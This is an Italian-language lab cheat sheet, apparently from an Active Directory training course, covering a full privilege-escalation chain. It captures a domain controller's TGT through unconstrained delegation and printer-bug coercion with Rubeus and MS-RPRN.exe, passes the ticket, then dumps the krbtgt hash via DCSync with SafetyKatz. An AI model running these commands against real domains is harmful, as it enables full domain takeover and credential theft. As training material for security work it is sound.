# Priv Esc - Unconstrained Delegation - Coercion - Abusing

#### Catturare il TGT del dcorp-DC (Server2) utilizzando Rubeus su dcorp-appsrv (Server1)

```powershell
Rubeus.exe monitor /interval:5 /nowrap
```

#### Eseguire MS-RPRN.exe (o altro) sulla student VM ([https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)):

```powershell
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

#### Copiare il TGT encodato in base64, rimuovere gli spazi extra se presenti e usarlo sulla student VM:

```powershell
Rubeus.exe ptt /ticket:<TGT BASE64QUI>
```

#### Una volta aggiunto il ticket e'possibile eseguire un DCSync:

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"
```
